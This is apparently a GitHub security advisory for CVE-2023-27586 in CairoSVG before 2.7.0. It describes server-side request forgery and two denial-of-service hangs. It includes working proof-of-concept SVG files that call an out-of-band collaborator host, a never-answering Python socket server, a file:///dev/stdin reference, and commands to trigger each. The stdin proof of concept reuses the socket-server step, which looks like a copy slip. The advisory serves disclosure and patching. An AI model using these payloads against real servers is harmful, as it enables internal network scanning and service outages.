# CairoSVG improperly processes SVG files loaded from external resources

**GHSA**: GHSA-rwmf-w63j-p7gv | **CVE**: CVE-2023-27586 | **Severity**: high (CVSS 9.9)

**CWE**: CWE-20, CWE-918

**Affected Packages**:
- **CairoSVG** (pip): < 2.7.0

## Description

# SSRF vulnerability

## Summary
When CairoSVG processes an SVG file, it can make requests to the inner host and different outside hosts.

## Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version
2.6.0

## Details
A specially crafted SVG file that loads an external resource from a URL. Remote attackers could exploit this vulnerability to cause a scan of an organization's internal resources or a DDOS attack on external resources.
It looks like this bug can affect websites and cause request forgery on the server.

## PoC
1. Generating malicious svg file:
1.1 CairoSVG_exploit.svg:
```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <image height="200" width="200" xlink:href="http://[jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com](http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/)/3" />
    <style type="text/css">@import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/5");</style>
    <style type="text/css">
         <![CDATA[
            @import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/9");
            rect { fill: red; stroke: blue; stroke-width: 3 }
         ]]>
    </style>
</svg>
```

1.2 CairoSVG_exploit_2.svg:
```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <defs>
        <pattern id="img1" patternUnits="userSpaceOnUse" width="600" height="450">
            <image xlink:href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/11" x="0" y="0" width="600" height="450" />
        </pattern>
    </defs>
    <path d="M5,50 l0,100 l100,0 l0,-100 l-100,0 M215,100 a50,50 0 1 1 -100,0 50,50 0 1 1 100,0 M265,50 l50,100 l-100,0 l50,-100 z" fill="url(#img1)" />
</svg>
```

1.3 CairoSVG_exploit_3.svg:
```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/13" />
</svg>
```

2. Run some commands:
`$ python3 -m cairosvg CairoSVG_exploit.svg -f png`
`$ python3 -m cairosvg CairoSVG_exploit_2.svg -f png`
`$ python3 -m cairosvg CairoSVG_exploit_3.svg -f png `

3. See result requests in Burp Collaborator:
![1](https://user-images.githubusercontent.com/952243/224340068-547b1d9a-5513-48a5-9cdf-b34b693f80c2.png)



# DOS vulnerability with SSTI

## Summary
When CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

## Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version
2.6.0

## PoC
1. Generating malicious svg file:

```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://192.168.56.1:1234/" />
</svg>
```

2. In other server run this python program:

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
```

3. Run commands:
`$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png`
(without timeout server will hang forever)


# DOS vulnerability with stdin file descriptor

## Summary

Specially crafted SVG file that opens /proc/self/fd/1 or /dev/stdin results in a hang with a tiny PoC file. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted SVG file.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

## Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version
2.6.0

## PoC
1. Generating malicious svg file:

```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="file:///dev/stdin" />
</svg>
```

2. In other server run this python program:
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
```

3. Run commands:
`$timeout 60 python3 -m cairosvg cariosvg_exploit_dos.svg -f png`
